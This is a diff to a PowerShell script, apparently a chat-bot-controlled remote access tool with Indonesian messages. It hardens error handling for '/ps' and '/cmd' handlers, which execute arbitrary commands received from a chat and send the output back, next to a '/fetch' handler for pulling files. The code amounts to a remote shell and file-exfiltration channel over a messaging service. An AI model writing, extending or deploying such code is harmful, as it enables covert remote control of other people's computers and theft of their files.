@@ -28,13 +28,17 @@ function Handle-OwnerCommands {
                 if ([string]::IsNullOrWhiteSpace($output)) { $output = "Berhasil dieksekusi tanpa output." }
                 Send-Msg -chatId $chatId -text "💻 **PS Output:**`n```text`n$output`n```"
             } catch {
-                Send-Msg -chatId $chatId -text "❌ **Error:**`n```text`n$_`n```"
+                Send-Msg -chatId $chatId -text "❌ **Error:**`n```text`n$($_.Exception.Message)`n```"
             }
         }
         "/cmd" {
             if (-not $args) { Send-Msg -chatId $chatId -text "⚠️ Masukkan command CMD."; return $handled }
-            $output = cmd.exe /c $args | Out-String
-            Send-Msg -chatId $chatId -text "🖥️ **CMD Output:**`n```text`n$output`n```"
+            try {
+                $output = cmd.exe /c $args | Out-String
+                Send-Msg -chatId $chatId -text "🖥️ **CMD Output:**`n```text`n$output`n```"
+            } catch {
+                Send-Msg -chatId $chatId -text "❌ **Error CMD.**"
+            }
         }
         "/fetch" {
             if (-not $args -or -not (Test-Path $args)) { Send-Msg -chatId $chatId -text "⚠️ File tidak ditemukan."; return $handled }
